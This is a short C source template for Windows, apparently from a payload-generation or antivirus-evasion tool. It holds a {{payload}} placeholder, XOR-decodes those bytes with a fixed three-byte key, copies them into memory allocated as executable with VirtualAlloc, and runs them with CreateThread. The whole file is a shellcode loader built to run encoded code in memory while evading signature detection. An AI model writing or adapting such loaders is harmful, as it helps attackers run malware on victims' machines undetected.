#include<windows.h>

int main(){
    {{payload}}
    unsigned char key[] = {0xbc, 0xab, 0xcb};
    for (int i=0;i<sizeof(payload);i++){
        for(int j=0;j<sizeof(key);j++){
            payload[i]^=key[j];
        }
    }
    PVOID Memory = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, payload, sizeof(payload));
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Memory, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
	return 0;
}